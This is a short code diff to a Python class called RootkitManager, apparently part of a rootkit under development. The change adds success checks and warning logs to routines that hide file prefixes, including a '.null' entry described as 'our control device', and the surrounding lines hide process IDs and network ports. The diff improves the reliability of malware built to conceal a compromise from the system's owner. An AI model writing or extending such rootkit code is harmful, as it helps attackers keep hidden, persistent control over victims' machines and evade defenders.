@@ -154,9 +154,14 @@ class RootkitManager:
             logger.debug("Rootkit: hid PID %d", pid)
 
         # Hide file prefixes from config
+        successful_prefixes = []
         for prefix in self._hidden_prefixes:
-            self._bridge.hide_file_prefix(prefix)
-            logger.debug("Rootkit: hiding files with prefix '%s'", prefix)
+            if self._bridge.hide_file_prefix(prefix):
+                logger.debug("Rootkit: hiding files with prefix '%s'", prefix)
+                successful_prefixes.append(prefix)
+            else:
+                logger.warning("Rootkit: failed to hide file prefix '%s'", prefix)
+        self._hidden_prefixes = successful_prefixes
 
         # Hide default data file prefixes
         default_prefixes = [
@@ -167,7 +172,10 @@ class RootkitManager:
             ".null",                      # our control device
         ]
         for prefix in default_prefixes:
-            self._bridge.hide_file_prefix(prefix)
+            if self._bridge.hide_file_prefix(prefix):
+                logger.debug("Rootkit: hiding default prefix '%s'", prefix)
+            else:
+                logger.warning("Rootkit: failed to hide default prefix '%s'", prefix)
 
         # Hide ports
         for port in self._hidden_ports:
